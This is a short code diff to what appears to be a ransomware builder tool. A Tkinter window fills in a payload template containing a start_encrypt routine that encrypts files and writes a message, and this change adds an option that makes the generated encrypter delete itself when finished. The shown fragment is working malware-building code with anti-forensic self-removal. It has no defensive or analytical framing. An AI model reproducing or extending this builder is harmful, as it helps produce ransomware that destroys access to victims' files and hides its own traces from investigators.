@@ -74,7 +74,7 @@ def start_encrypt(p, key):
                     f.write(message)
                     f.close()
 
-        #os.remove(sys.argv[0]) # destroy encrypter when finished
+        <destruct>
     except Exception as e:
         pass # continue if error
 
@@ -169,6 +169,11 @@ class mainwindow(Tk):
     for line in ext.split('\n'):
         list = list + "%s" % ("'." + line + "',\n")
     demon = demon.replace('<ext>', list)
+
+    if destruct == 1:
+        demon = demon.replace('<destruct>', 'os.remove(sys.argv[0])')
+    else:
+        demon = demon.replace('<destruct>', '')
 
 
     if mode == 1:
